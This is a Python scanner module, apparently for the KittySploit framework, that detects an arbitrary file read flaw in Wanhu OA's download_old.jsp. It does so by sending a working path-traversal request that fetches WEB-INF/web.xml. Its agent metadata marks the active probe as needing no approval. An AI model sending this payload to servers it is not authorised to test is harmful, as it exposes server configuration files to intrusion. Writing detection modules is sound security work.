#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is an arbitrary file download vulnerability in the Wanhu OA download_old."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Wanhu OA download_old.jsp - Arbitrary File Read Detection',
        'description': 'There is an arbitrary file download vulnerability in the Wanhu OA download_old.jsp file. An attacker can download any file on the server through the vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wanhu', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://wiki.peiqi.tech/wiki/oa/万户OA/万户OA%20download_old.jsp%20任意文件下载漏洞.html',
            'https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/wanhu-oa-download-old-file-read.yaml',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<?xml version=', 'web-app', 'display-name',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Wanhu OA download_old.jsp - Arbitrary File Read detected",
                path='/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml',
            )
            return True
        return False

